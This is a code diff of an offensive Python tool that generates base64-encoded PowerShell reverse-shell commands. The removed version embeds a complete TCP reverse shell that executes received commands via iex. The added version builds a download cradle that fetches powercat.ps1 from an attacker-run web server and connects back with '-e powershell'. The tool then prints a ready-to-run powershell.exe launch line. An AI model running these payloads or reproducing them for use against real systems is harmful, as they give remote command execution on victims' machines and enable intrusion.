@@ -1,33 +1,23 @@
 #!/usr/bin/python3
 from base64 import b64encode
 
-def generate_payload(ip: str, port: int):
-    payload = f"$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\", {port});"
-    payload += """$stream = $client.GetStream();
-[byte[]]$bytes = 0..65535|%{0};
-
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
-$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-$sendback = (iex $data 2>&1 | Out-String );
-$sendback2 = $sendback + "PS " + (pwd).Path + "> ";
-$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-$stream.Write($sendbyte,0,$sendbyte.Length);
-$stream.Flush()
-};
-$client.Close()"""
+def generate_payload(ip: str, port: int, webport: int):
+    payload = f"IEX (New-Object System.Net.Webclient).DownloadString(\"http://{ip}:{webport}/windows/powercat.ps1\");"
+    payload += f"powercat -c {ip} -p {port} -e powershell"
     return payload
 
 if __name__ == "__main__":
     from lib.prog import *
     prog = Prog(
         "gen_pwsh_rshell",
-        "Generates a Powershell Base64-encoded payload.", [
+        "Runs a download cradle for a Powercat reverse shell. Assumes you're using the webserver in the ./http directory.", [
             Arg(ArgType.POSITIONAL, "ip", arg_val_type=str, arg_help="IP address of reverse shell"),
             Arg(ArgType.POSITIONAL, "port", arg_val_type=int, arg_help="Port of reverse shell"),
+            Arg(ArgType.POSITIONAL, "webport", arg_val_type=int, arg_help="Port of web server hosting powercat"),
             Arg(ArgType.OPTIONAL_FLAG, "fork", "f", arg_val_type=bool, arg_help="Whether or not the reverse shell should be run in a new process")
         ]
     )
-    payload = generate_payload(prog.args["ip"], int(prog.args["port"]))
+    payload = generate_payload(prog.args["ip"], int(prog.args["port"]), int(prog.args["webport"]))
     payload_b = payload.encode("utf-16le")  # pwsh uses utf-16 little endian
     payload_enc = b64encode(payload_b).decode()
 
@@ -41,3 +31,4 @@ if __name__ == "__main__":
         print(f"powershell.exe start-process powershell.exe -ArgumentList '{args}'")
     else:
         print(f"powershell.exe {args}")
+    
